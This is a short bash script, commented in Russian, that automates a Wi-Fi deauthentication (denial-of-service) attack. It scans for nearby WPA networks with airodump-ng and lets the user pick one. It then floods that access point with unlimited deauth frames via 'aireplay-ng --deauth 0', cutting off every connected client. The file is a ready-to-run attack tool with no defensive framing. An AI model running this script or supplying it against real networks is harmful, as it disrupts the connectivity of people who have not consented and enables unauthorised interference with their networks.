#!/bin/bash
# Скрипт деаунтефикации клиентов вай фай, автор kirikra
echo "ВНИМАНИЕ: данный модуль требует- root, вайфай адаптер и режимом монитора"
sleep 7
# Функция для сканирования Wi-Fi сетей
scan_networks() {
    rm file-01.cap file-01.csv file-01.kismet.csv file-01.kismet.netxml file-01.log.csv scan_results-01.csv
    echo "Сканирование Wi-Fi сетей..."
    airodump-ng wlan1 --output-format csv -w scan_results --write-interval 15 --showack &
    sleep 15
    pkill airodump-ng
    echo "Сети найдены:"
    cat scan_results-01.csv | grep "WPA" | awk -F, '{print NR") BSSID:", $1, "Канал:", $4, "ESSID:", $14}'
}

# функция атаки на сеть 
dos() {
    read -p "Выбери номер сети для записи (из представленных выше): " network
    BSSID=$(cat scan_results-01.csv | grep "WPA" | awk -F, 'NR=='$network' {print $1}')
    CHANNEL=$(cat scan_results-01.csv | grep "WPA" | awk -F, 'NR=='$network' {print $4}')
    airodump-ng --bssid $BSSID -c $CHANNEL wlan1
    sleep 3
    pkill airodump-ng
    aireplay-ng --deauth 0 -a $BSSID wlan1
}

# Вызов функций
scan_networks
dos
